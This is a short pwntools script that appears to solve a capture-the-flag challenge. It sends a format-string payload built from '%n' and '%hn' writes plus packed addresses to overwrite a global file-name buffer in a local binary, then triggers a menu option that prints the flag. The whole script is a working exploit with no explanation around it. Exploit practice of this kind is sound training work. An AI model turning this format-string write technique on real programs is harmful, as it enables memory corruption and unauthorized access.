from pwn import *

# context.log_level = 'debug'
exe = context.binary = ELF('./chall', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
r = exe.process()
# gdb.attach(r, api=True, gdbscript='''
#            b*0x00000000004012bf
#            ''')

libc_base = 0x114a37
file_name = 0x404080

r.sendlineafter(b'>> ', b'1')
fmt = b'%14$n%26465c%15$hn%1285c%16$hn%1992c%17$hn%74c%18$hn'.ljust(64, b'\x00') + p64(file_name + 8) + p64(file_name + 2) + p64(file_name) + p64(file_name + 4) + p64(file_name + 6)
r.sendafter(b'payload: ', fmt)

#get flags
r.sendlineafter(b'>> ', b'2')
print(r.recv())

r.interactive()